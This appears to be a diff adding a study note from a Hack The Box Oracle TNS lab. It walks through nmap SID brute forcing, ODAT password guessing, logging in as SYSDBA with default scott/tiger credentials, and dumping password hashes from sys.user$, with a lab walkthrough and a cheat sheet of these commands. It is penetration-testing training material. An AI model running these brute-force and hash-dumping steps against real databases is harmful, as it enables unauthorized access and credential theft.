@@ -1,0 +1,516 @@
+Oracle TNS
+
+## Overview
+
+Oracle Transparent Network Substrate (TNS) is a communication protocol used by Oracle databases and applications to communicate over a network.
+
+TNS is part of Oracle Net Services and supports:
+
+- Name resolution
+- Connection management
+- Load balancing
+- Security
+- TCP/IP communication
+- IPv6
+- SSL/TLS encryption
+
+Oracle TNS is commonly found in enterprise environments such as:
+
+- Healthcare
+- Finance
+- Retail
+- Large enterprise infrastructures
+
+---
+
+# Default Port
+
+Oracle TNS Listener commonly uses:
+
+```text
+1521/TCP
+
+The port can be changed depending on the installation/configuration.
+
+Important Oracle Files
+
+Oracle commonly uses:
+
+tnsnames.ora
+listener.ora
+
+Typical location:
+
+$ORACLE_HOME/network/admin
+tnsnames.ora
+
+tnsnames.ora is used by Oracle clients to resolve service names to network addresses.
+
+Example:
+
+ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+
+Important parameters include:
+
+DESCRIPTION
+ADDRESS
+PROTOCOL
+PORT
+CONNECT_DATA
+INSTANCE_NAME
+SERVICE_NAME
+SERVER
+USER
+PASSWORD
+SECURITY
+VALIDATE_CERT
+SSL_VERSION
+CONNECT_TIMEOUT
+RECEIVE_TIMEOUT
+SEND_TIMEOUT
+listener.ora
+
+listener.ora is a server-side configuration file controlling the Oracle listener.
+
+Example:
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+Oracle SID
+
+A System Identifier (SID) identifies a specific Oracle database instance.
+
+The SID is important because clients use it when connecting to an Oracle database.
+
+If an incorrect SID is supplied, the connection can fail.
+
+Example:
+
+SID = XE
+Enumeration Methodology
+
+Use this workflow:
+
+Discover 1521
+      ↓
+Identify Oracle TNS
+      ↓
+Enumerate Version
+      ↓
+Enumerate SID
+      ↓
+Enumerate Service Name
+      ↓
+Find Valid Credentials
+      ↓
+Connect with SQL*Plus
+      ↓
+Enumerate Users
+      ↓
+Enumerate Privileges
+      ↓
+Enumerate Database
+      ↓
+Retrieve Relevant Hashes
+Nmap Enumeration
+Basic Oracle TNS Scan
+sudo nmap -p1521 -sV <TARGET> --open
+
+Example:
+
+sudo nmap -p1521 -sV 10.129.205.19 --open
+
+Example result:
+
+1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+SID Enumeration
+
+Nmap provides the:
+
+oracle-sid-brute
+
+NSE script.
+
+Run:
+
+sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute
+
+Example:
+
+sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
+
+Example result:
+
+| oracle-sid-brute:
+|_  XE
+
+Therefore:
+
+SID = XE
+Important Note About oracle-sid-brute
+
+SID brute forcing can take a long time because the script tests many possible SIDs.
+
+For example, a scan may remain around:
+
+97.83% done
+
+for several minutes.
+
+If the target is an HTB lab and the script is taking unusually long, monitor it rather than repeatedly launching new scans.
+
+ODAT
+Oracle Database Attacking Tool
+
+ODAT is an open-source Python tool designed to enumerate and test Oracle database security.
+
+It supports modules for:
+
+TNS communication
+SID guessing
+Service-name guessing
+Password guessing
+Database enumeration
+Password hash retrieval
+File operations
+Privilege escalation
+Command execution
+Vulnerability checks
+Installing ODAT
+
+Install required packages:
+
+sudo apt update
+sudo apt install -y build-essential python3-dev libaio1
+
+Clone ODAT:
+
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+
+Install dependencies:
+
+pip install python-libnmap
+pip install pycryptodome
+pip install openpyxl
+
+If cx_Oracle is missing, install the version used in the Academy setup:
+
+wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
+tar xzf cx_Oracle-8.3.0.tar.gz
+cd cx_Oracle-8.3.0
+python3 setup.py build
+sudo python3 setup.py install
+
+Return to ODAT:
+
+cd ~/odat
+
+Test:
+
+./odat.py -h
+ODAT Help
+./odat.py -h
+
+Important modules include:
+
+all
+tnscmd
+tnspoison
+sidguesser
+snguesser
+passwordguesser
+passwordstealer
+search
+privesc
+cve
+ODAT SID Enumeration
+
+Specific SID enumeration:
+
+./odat.py sidguesser -s <TARGET>
+
+However, avoid running the complete all module blindly if you already know the SID.
+
+ODAT Full Enumeration
+
+The Academy demonstrates:
+
+./odat.py all -s <TARGET>
+
+Example:
+
+./odat.py all -s 10.129.205.19
+
+ODAT can perform multiple enumeration modules, so this can take significant time.
+
+If you already know the SID, use specific modules where possible.
+
+Password Guessing
+
+ODAT provides:
+
+passwordguesser
+
+Example:
+
+./odat.py passwordguesser -s <TARGET> -d <SID>
+
+Example:
+
+./odat.py passwordguesser -s 10.129.205.19 -d XE
+
+A successful result may look like:
+
+[+] Accounts found on 10.129.205.19:1521/sid:XE:
+scott/tiger
+SQL*Plus
+
+SQL*Plus can be used to interact with an Oracle database.
+
+Check the installed version:
+
+sqlplus -v
+
+Example:
+
+SQL*Plus: Release 19.0.0.0.0 - Production
+Version 19.6.0.0.0
+SQL*Plus Connection
+
+General syntax:
+
+sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>
+
+Example:
+
+sqlplus scott/tiger@10.129.205.19/XE
+SYSDBA Connection
+
+If the authorized account has sufficient privileges:
+
+sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba
+
+Example:
+
+sqlplus scott/tiger@10.129.205.19/XE as sysdba
+
+Successful connection:
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0
+Oracle Database Enumeration
+List Tables
+select table_name from all_tables;
+Show Current User Privileges
+select * from user_role_privs;
+
+Example:
+
+USERNAME   GRANTED_ROLE
+SCOTT      CONNECT
+SCOTT      RESOURCE
+Password Hash Enumeration
+
+One important Oracle enumeration technique is querying:
+
+select name, password from sys.user$;
+
+Example:
+
+NAME                         PASSWORD
+---------------------------  ----------------
+SYS                          FBA343E7D6C8BC9D
+SYSTEM                       B5073FE1DE351687
+OUTLN                        4A3BA55E08595C81
+
+This requires sufficient database privileges.
+
+ODAT Password Stealer
+
+ODAT provides the:
+
+passwordstealer
+
+module.
+
+View its options:
+
+./odat.py passwordstealer -h
+
+Important option:
+
+--get-passwords
+
+General syntax:
+
+./odat.py passwordstealer \
+-s <TARGET> \
+-p 1521 \
+-U <USER> \
+-P <PASSWORD> \
+-d <SID> \
+--get-passwords
+
+Example:
+
+./odat.py passwordstealer \
+-s 10.129.205.19 \
+-p 1521 \
+-U scott \
+-P tiger \
+-d XE \
+--get-passwords
+HTB Oracle TNS Lab
+Target
+10.129.205.19
+Step 1 — Identify Oracle TNS
+sudo nmap -p1521 -sV 10.129.205.19 --open
+
+Result:
+
+1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0
+Step 2 — Enumerate SID
+sudo nmap -p1521 -sV 10.129.205.19 \
+--open \
+--script oracle-sid-brute
+
+Result:
+
+| oracle-sid-brute:
+|_  XE
+
+Therefore:
+
+SID = XE
+Step 3 — Credential Enumeration
+
+Using ODAT:
+
+./odat.py passwordguesser -s 10.129.205.19 -d XE
+
+Example discovered credentials:
+
+scott/tiger
+Step 4 — Connect
+sqlplus scott/tiger@10.129.205.19/XE as sysdba
+Step 5 — Enumerate Oracle Users
+select name, password from sys.user$;
+
+Look for the required account:
+
+DBSNMP
+HTB Question
+Question 1
+Enumerate the target Oracle database and submit the password hash of the user DBSNMP.
+
+Expected workflow:
+
+1521
+ ↓
+Oracle TNS
+ ↓
+SID = XE
+ ↓
+Valid credentials
+ ↓
+SQL*Plus
+ ↓
+SYSDBA
+ ↓
+sys.user$
+ ↓
+DBSNMP
+ ↓
+Password hash
+Practical Checklist
+[ ] Scan TCP/1521
+[ ] Identify Oracle TNS version
+[ ] Enumerate SID
+[ ] Identify service name
+[ ] Install/check ODAT
+[ ] Enumerate valid credentials
+[ ] Connect using SQL*Plus
+[ ] Check current privileges
+[ ] Enumerate database tables
+[ ] Enumerate Oracle users
+[ ] Retrieve password hashes if authorized
+[ ] Identify DBSNMP hash
+Quick Cheat Sheet
+Find Oracle TNS
+sudo nmap -p1521 -sV <TARGET> --open
+Find SID
+sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute
+ODAT Help
+./odat.py -h
+ODAT Full Enumeration
+./odat.py all -s <TARGET>
+Find Credentials
+./odat.py passwordguesser -s <TARGET> -d <SID>
+SQL*Plus
+sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>
+SQL*Plus as SYSDBA
+sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba
+List Tables
+select table_name from all_tables;
+Check Privileges
+select * from user_role_privs;
+Get Oracle Password Hashes
+select name, password from sys.user$;
+ODAT Password Hashes
+./odat.py passwordstealer \
+-s <TARGET> \
+-p 1521 \
+-U <USER> \
+-P <PASSWORD> \
+-d <SID> \
+--get-passwords
+Key Takeaways
+Oracle TNS commonly listens on TCP/1521.
+Always identify the Oracle TNS version first.
+The Oracle SID is critical for establishing a database connection.
+oracle-sid-brute can identify valid SIDs but may be slow.
+ODAT provides many Oracle enumeration modules.
+passwordguesser can identify valid credentials.
+SQL*Plus is useful for direct Oracle database interaction.
+user_role_privs reveals the current user's database roles.
+sys.user$ can contain Oracle password hashes when sufficient privileges exist.
+Don't rely only on automated tools; understand what each module is actually doing.
+Enumeration Mindset
+PORT
+ ↓
+SERVICE
+ ↓
+VERSION
+ ↓
+SID
+ ↓
+CREDENTIALS
+ ↓
+AUTHENTICATION
+ ↓
+PRIVILEGES
+ ↓
+DATABASE
+ ↓
+USERS
+ ↓
+HASHES
+ ↓
+ATTACK PATH
